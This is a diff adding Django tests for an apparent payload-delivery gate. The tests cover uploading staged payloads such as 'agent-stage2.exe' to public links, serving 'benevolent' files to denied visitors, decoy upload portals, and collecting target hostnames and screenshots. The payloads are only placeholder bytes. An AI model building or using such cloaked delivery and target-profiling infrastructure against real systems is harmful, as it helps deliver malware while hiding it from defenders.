@@ -2050,3 +2050,147 @@ class OperatorPrefixTests(TestCase):
 
 
 
+
+@override_settings(AUTO_BAN_THRESHOLD=0)
+class PayloadManagerTests(TestCase):
+    def setUp(self):
+        import shutil
+        import tempfile
+        media = tempfile.mkdtemp(prefix="rof-media-")
+        patch = override_settings(MEDIA_ROOT=media)
+        patch.enable()
+        self.addCleanup(patch.disable)
+        self.addCleanup(shutil.rmtree, media, True)
+        self.operator = Operator.objects.create_user(username="pmop", password="long-enough-password-123")
+        self.client = Client()
+        self.client.force_login(self.operator)
+        self.public = Client()
+
+    def _file_link(self, path="/g/pm/one", payload=b"X" * 64, name="one.bin", **kwargs):
+        link = DeliveryLink.objects.create(path=path, kind="file", placeholder="blank", **kwargs)
+        link.payload.save(name, ContentFile(payload), save=True)
+        return link
+
+    def test_quick_drop_creates_live_file_link(self):
+        response = self.client.post(reverse("gate-link-quick-drop"), {
+            "file": ContentFile(b"PAYLOADBYTES", name="update.bin"), "name": "Q4 update"})
+        self.assertEqual(response.status_code, 200)
+        body = response.json()
+        link = DeliveryLink.objects.get(pk=body["id"])
+        self.assertEqual(link.kind, "file")
+        self.assertTrue(link.active)
+        self.assertEqual(link.label, "Q4 update")
+        from django.conf import settings as dj_settings
+        self.assertTrue(link.path.startswith(dj_settings.GATE_BASE_PATH))
+        served = self.public.get(link.path)
+        self.assertEqual(served.status_code, 200)
+        self.assertEqual(served.content, b"PAYLOADBYTES")
+
+    def test_quick_drop_requires_file(self):
+        response = self.client.post(reverse("gate-link-quick-drop"), {"name": "nothing"})
+        self.assertEqual(response.status_code, 400)
+        self.assertEqual(DeliveryLink.objects.count(), 0)
+
+    def test_quick_drop_labels_from_filename(self):
+        response = self.client.post(reverse("gate-link-quick-drop"), {
+            "file": ContentFile(b"Z", name="agent-stage2.exe")})
+        self.assertEqual(response.status_code, 200)
+        self.assertEqual(response.json()["label"], "agent-stage2.exe")
+
+    def test_payloads_page_lists_payload_links(self):
+        link = self._file_link()
+        response = self.client.get(reverse("gate-payloads"))
+        self.assertContains(response, link.payload.name.rsplit("/", 1)[-1])
+        self.assertContains(response, "one")  # stored name keeps the uploaded stem
+        self.assertContains(response, link.path)
+
+    def test_payloads_replace_keeps_url_swaps_file(self):
+        link = self._file_link(payload=b"OLD")
+        old_name = link.payload.name
+        response = self.client.post(reverse("gate-payloads"), {
+            "link_id": link.pk, "action": "replace",
+            "payload": ContentFile(b"NEWCONTENT", name="two.bin")})
+        self.assertRedirects(response, reverse("gate-payloads"))
+        link.refresh_from_db()
+        self.assertNotEqual(link.payload.name, old_name)
+        self.assertIn("two.bin", link.payload.name)
+        served = self.public.get(link.path)
+        self.assertEqual(served.status_code, 200)
+        self.assertEqual(served.content, b"NEWCONTENT")
+
+    def test_payloads_clear_removes_file_link_stays(self):
+        link = self._file_link()
+        response = self.client.post(reverse("gate-payloads"), {"link_id": link.pk, "action": "clear"})
+        self.assertRedirects(response, reverse("gate-payloads"))
+        link.refresh_from_db()
+        self.assertFalse(link.payload)
+        # Link object survives; serving now fails closed rather than 500s.
+        self.assertIn(self.public.get(link.path).status_code, (404, 502))
+
+    def test_payloads_clear_benevolent(self):
+        link = DeliveryLink.objects.create(path="/g/pm/ben", kind="file", on_deny="benevolent")
+        link.benevolent_file.save("deny.bin", ContentFile(b"DENY"), save=True)
+        self.client.post(reverse("gate-payloads"), {"link_id": link.pk, "action": "clear_benevolent"})
+        link.refresh_from_db()
+        self.assertFalse(link.benevolent_file)
+
+    def test_payloads_page_shows_gate_intel(self):
+        link = self._file_link()
+        submission = Submission.objects.create(
+            link=link, decoded_json={"hostname": "dc01"}, client_ip_hash="a" * 64)
+        SubmissionImage.objects.create(
+            submission=submission, field_name="screenshot",
+            image=ContentFile(b"\x89PNG\r\n\x1a\n" + b"\x00" * 16, name="s.png"))
+        response = self.client.get(reverse("gate-payloads"))
+        self.assertContains(response, "dc01")
+        self.assertContains(response, "1 img")
+        self.assertContains(response, "1 SUB")
+
+    def test_payloads_page_lists_benevolent_and_decoys(self):
+        link = DeliveryLink.objects.create(path="/g/pm/b2", kind="file", on_deny="benevolent")
+        link.benevolent_file.save("sorry.html", ContentFile(b"<html>"), save=True)
+        page = DecoyPage.objects.create(name="Portal", kind="upload", active=True)
+        page.html_file.save("portal.html", ContentFile(b"<html>portal</html>"), save=True)
+        response = self.client.get(reverse("gate-payloads"))
+        self.assertContains(response, link.benevolent_file.name.rsplit("/", 1)[-1])
+        self.assertContains(response, "Portal")
+
+    def test_link_detail_renders_download_chart(self):
+        link = self._file_link()
+        self.public.get(link.path)
+        response = self.client.get(reverse("gate-link-detail", args=[link.pk]))
+        self.assertContains(response, 'id="payload-chart"')
+        self.assertContains(response, 'id="payload-series"')
+        marker = '<script id="payload-series" type="application/json">'
+        blob = response.content.decode().split(marker, 1)[1].split("</script>", 1)[0]
+        series = json.loads(blob)
+        self.assertEqual(len(series), 14)
+        self.assertEqual(series[-1]["count"], 1)
+
+    def test_link_form_has_drag_drop_zones(self):
+        response = self.client.get(reverse("gate-link-create"))
+        self.assertContains(response, 'drop-zone" data-file-input="payload-input"')
+        self.assertContains(response, 'data-file-input="benevolent-input"')
+
+    def test_nav_links_to_payloads(self):
+        response = self.client.get(reverse("overview"))
+        self.assertContains(response, reverse("gate-payloads"))
+
+    def test_safe_size_helpers_survive_missing_files(self):
+        link = self._file_link()
+        link.payload.delete(save=False)  # removes from storage, name still set
+        link.refresh_from_db()
+        self.assertIsNone(link.payload_size)
+        page = DecoyPage.objects.create(name="Gone", kind="upload")
+        self.assertIsNone(page.html_file_size)
+
+    def test_api_exposes_payload_fields(self):
+        _, raw = APIKey.create(operator=self.operator, name="ci")
+        link = self._file_link(payload=b"N" * 32)
+        response = self.client.get("/api/v1/links/", HTTP_AUTHORIZATION=f"ApiKey {raw}")
+        self.assertEqual(response.status_code, 200)
+        entry = next(item for item in response.json() if item["id"] == link.pk)
+        self.assertIn("one", entry["payload"])
+        self.assertIn(".bin", entry["payload"])
+        self.assertEqual(entry["payload_size"], 32)
+        self.assertIsNone(entry["benevolent_file"])
